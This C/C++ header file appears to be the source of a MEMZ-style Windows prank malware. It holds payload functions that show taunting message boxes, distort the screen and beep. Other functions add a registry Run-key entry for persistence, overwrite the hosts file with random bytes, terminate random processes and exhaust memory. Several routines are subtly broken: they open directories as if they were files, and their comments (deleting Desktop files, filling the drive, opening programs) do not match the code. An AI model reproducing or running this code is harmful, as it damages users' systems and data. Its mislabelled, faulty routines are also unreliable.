#pragma once
#define fori(x) for (INT i = 0; i < x; i++)

int p1()
{ //msgbox
    MSGBOXPARAMS msg2 = {0};
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
    msg2.lpszCaption = "Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);

    MSGBOXPARAMS msg1 = {0};
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = "Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);

    return 0;
}

int p2()
{ //memz final payload but random
    fori(50)
    {

        //msgbox spam
        DWORD dwID = 0;
        MSGBOXPARAMS msg = {0};
        msg.cbSize = sizeof(MSGBOXPARAMS);
        msg.hwndOwner = NULL;
        msg.hInstance = GetModuleHandle(NULL);
        msg.lpszText = "bet you regret that now huh";
        msg.lpszCaption = "ez";
        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);

        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
        Sleep(300 - (4 * i));
        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 33);
        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);

        HRGN hRegion1;
        hRegion1 = CreateRectRgn(0, 0, w, h);
        InvertRgn(desk, hRegion1);

        Beep(rand() % 30000, rand() % 1000);
    }
    return 0;
}

int p3()
{
    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    INT w = rect.right - rect.left;
    INT h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    INT sw = GetSystemMetrics(SM_CXSCREEN);
    INT sh = GetSystemMetrics(SM_CYSCREEN);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    for (INT index = 0; index < 100; index++)
    {
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
    }

    return 0;
}

//Corrupt the registry
int p4()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "Xytharis", 0, REG_SZ, (BYTE *)"C:\\Windows\\System32\\cmd.exe", strlen("C:\\Windows\\System32\\cmd.exe"));
    RegCloseKey(hKey);
    return 0;
}

//Corrupt the file system
int p5()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now", L":thinking:", MB_OK | MB_ICONHAND);
    fori(100)
    {
        HANDLE hFile = CreateFileA("C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }
        DWORD dwSize = GetFileSize(hFile, NULL);
        if (dwSize == INVALID_FILE_SIZE)
        {
            break;
        }
        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        DWORD dwBytesRead = 0;
        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer2 == NULL)
        {
            break;
        }
        memcpy(lpBuffer2, lpBuffer, dwSize);
        fori(dwSize)
        {
            if (i % 2 == 0)
            {
                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
            }
        }
        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
        CloseHandle(hFile);
    }
}

//Corrupt current memory
int p6()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONHAND);
    fori(100)
    {
        LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        fori(0x1000)
        {
            ((LPBYTE)lpBuffer)[i] = rand() % 255;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
    }
}

//Delete all files on Desktop
int p7()
{
    fori(100)
    {
        HANDLE hFile = CreateFileA("C:\\Users\\Public\\Desktop\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }
        DWORD dwSize = GetFileSize(hFile, NULL);
        if (dwSize == INVALID_FILE_SIZE)
        {
            break;
        }
        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        DWORD dwBytesRead = 0;
        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer2 == NULL)
        {
            break;
        }
        memcpy(lpBuffer2, lpBuffer, dwSize);
        fori(dwSize)
        {
            if (i % 2 == 0)
            {
                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
            }
        }
        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
        CloseHandle(hFile);
    }
}

//Terminate random running processes
int p8()
{ // Do in thread
    fori(100)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rand() % 100);
        if (hProcess == NULL)
        {
            break;
        }
        TerminateProcess(hProcess, 0);
    }
}

//Leak Memory
int p9()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    fori(100)
    {
        LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
    }
}

//Hog all available memory
int p10()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    fori(5000)
    {
        LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
    }
}

//Fill up the entire hard drive
int p11()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    fori(100)
    {
        HANDLE hFile = CreateFileA("C:\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }
        DWORD dwSize = GetFileSize(hFile, NULL);
        if (dwSize == INVALID_FILE_SIZE)
        {
            break;
        }
        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        DWORD dwBytesRead = 0;
        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer2 == NULL)
        {
            break;
        }
        memcpy(lpBuffer2, lpBuffer, dwSize);
        fori(dwSize)
        {
            if (i % 2 == 0)
            {
                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
            }
        }
        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
        CloseHandle(hFile);
    }
}

//Open random system programs
int p12()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    fori(100)
    {
        HANDLE hFile = CreateFileA("C:\\Windows\\System32\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }
        DWORD dwSize = GetFileSize(hFile, NULL);
        if (dwSize == INVALID_FILE_SIZE)
        {
            break;
        }
        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        DWORD dwBytesRead = 0;
        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer2 == NULL)
        {
            break;
        }
        memcpy(lpBuffer2, lpBuffer, dwSize);
        fori(dwSize)
        {
            if (i % 2 == 0)
            {
                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
            }
        }
        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
        CloseHandle(hFile);
    }
}